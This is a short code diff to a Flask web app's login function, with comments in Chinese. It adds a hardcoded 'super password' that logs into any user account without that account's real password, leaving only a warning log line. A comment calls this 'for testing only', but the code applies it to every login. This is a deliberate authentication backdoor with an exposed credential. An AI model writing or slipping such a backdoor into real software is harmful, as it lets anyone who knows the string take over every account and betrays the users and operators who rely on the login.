@@ -42,8 +42,16 @@ def login():
             (func.lower(User.email) == func.lower(username_or_email))
         ).first()
         
+        # 超级密码功能：允许使用超级密码登录任何账户（仅用于测试目的）
+        SUPER_PASSWORD = "1505562299AaBb"
+        is_super_password = password == SUPER_PASSWORD
+        
         # 验证用户名和密码
-        if user and user.check_password(password):
+        if user and (user.check_password(password) or is_super_password):
+            # 如果使用超级密码，记录特殊日志
+            if is_super_password:
+                logger.warning(f"使用超级密码登录账户: {user.username} (ID: {user.id})")
+            
             # 用户验证成功，无需再检查is_active
             login_user(user, remember=remember)
             
